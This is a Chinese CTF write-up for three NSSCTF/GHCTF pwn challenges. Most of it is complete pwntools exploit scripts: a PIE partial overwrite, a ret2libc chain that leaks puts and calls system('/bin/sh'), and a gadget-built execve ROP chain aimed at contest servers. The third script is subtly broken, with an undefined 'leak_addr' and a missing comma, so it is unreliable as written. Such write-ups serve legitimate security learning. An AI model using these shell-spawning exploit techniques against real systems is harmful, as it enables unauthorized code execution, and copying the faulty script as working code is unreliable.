# NSSCTF新生赛GHCTF

by Maple

## hello_world

其实就是一个pie绕过，没什么好说的

```python
from pwn import *
context.log_level = 'debug'
elf = ELF('./pwn')
p = remote('node2.anna.nssctf.cn',28577)
#p = process('./pwn')
pop_rdi = 0x0000000000000a63
sys = elf.sym['system']
shell = 0x9C5
binsh = 0x0000000000000b5b
log.info(hex(sys))
payload = b'a'*0x20+b'b'*0x8+b'\xC5\x09'
p.send(payload)
p.interactive()
```

## ret2libc1

题目有个后门，输入7有新操作，可以把hell_money转回$,就可以买商店然后溢出了

```python
from pwn import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
elf = ELF("./pwn")
libc = ELF("./libc.so.6")
p = process('./pwn')
#p = remote('node2.anna.nssctf.cn',28468)

#-----刷钱-------
p.sendlineafter(b'money\n',b'3')
p.sendlineafter(b'hell_money?\n',b'1')
p.sendlineafter(b'money\n',b'7')
p.sendlineafter(b'?',b'1000')
p.sendlineafter(b'money\n',b'5')

#-------libc--------
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = elf.sym['main']
pop_rdi = 0x0000000000400d73
payload1 = b'a'*0x40+b'b'*0x8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
p.sendline(payload1)
#log.info(payload1)
puts_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
log.info("puts"+hex(puts_addr))
libc_base = puts_addr-libc.symbols['puts']
log.info("libc_base:"+hex(libc_base))

#----------shell---------
p.sendlineafter(b'money\n',b'5')
#p.sendline(b'5')
binsh = libc_base+next(libc.search(b'/bin/sh'))
sys = libc_base+libc.sym['system']
payload2 = b'b'*0x48+p64(pop_rdi)+p64(binsh)+p64(sys)
p.recvuntil(b'name it!!!\n')
p.sendline(payload2)
p.interactive()
```

## 真会布置栈嘛

就是个ROP，就是得多点步骤而已,直接注释在exp里

```python
from pwn import *
context(os='linux', arch='amd64',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
#p = process('./pwn')
p = remote('node2.anna.nssctf.cn',28950)
elf = ELF('./pwn')

leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
log.info("leak_addr"+hex(leak_addr))
binsh = leak+0x20

pop_rsi_rdi_rbx_r13_r15_jmp_r15 = 0x0000000000401017
mov_rsi_rsp = 0x000000000401048
syscall = 0x401077
xchg_rax_r13 = 0x40100C
ret_addr = 0x0000000000401013
main = 0x401033
xor_rax_read_gadgets_addr = 0x000000000401069
add_rbx_8_jmp_rbx_value = 0x401011
pop_rbx_r13_r15_jmp_r15 = 0x401019
xor_rdx_jmp_r15 = 0x401021
xor_rsi_jmp_r15 = 0x401027
pop_r13_r15_jmp_r15 = 0x40101A

payload = flat(
        p64(pop_rsi_rdi_rbx_r13_r15_jmp_r15),
        p64(0)+p64(0)+p64(0),	#rsi = 0（输入缓冲区地址）,rdi = 0（标准输入文件描述符）,rbx = 0,r13 = 0
        p64(xor_rax_read_gadgets_addr),	# rax = 0,跳转read
        )
pause()	# 通过溢出覆盖返回地址，再次利用read
p.send(payload)

payload2 = flat(
        p64(main),	# 利于下次调用
        p64(0),
        p64(binsh+0x38+0x10),	# /bin/sh所在位置
        p64(binsh+0x30-0x8),
        p64(0x3b),	# 系统调用号
        p64(pop_r13_r15_jmp_r15),
        p64(0x3b),	#r13 = 0x3b,为paylaod3准备
        p64(add_rbx_8_jmp_rbx_value)
        p64(xor_rdx_jmp_r15),	
        p64(xor_rsi_jmp_r15),	# rdx,rsi归零
        p64(syscall),	# 系统调用
        b'/bin/sh\x00'*0x8	# 写入/bin/sh，这里写8为了对齐
        )
p.send(payload2)

payload3 =flat(
        p64(pop_rsi_rdi_rbx_r13_r15_jmp_r15),	# rdi指向/bin/sh的地址（rsi，rdx前面归零了，这边就不用管了）
        p64(binsh),
        p64(0),
        p64(0x3b),
        p64(xchg_rax_r13),	#通过r13给rax赋值，可以接上调用
        p64(pop_rsi_rdi_rbx_r13_r15_jmp_r15)
        )
pause()
p.send(payload3)
p.interactive()
```

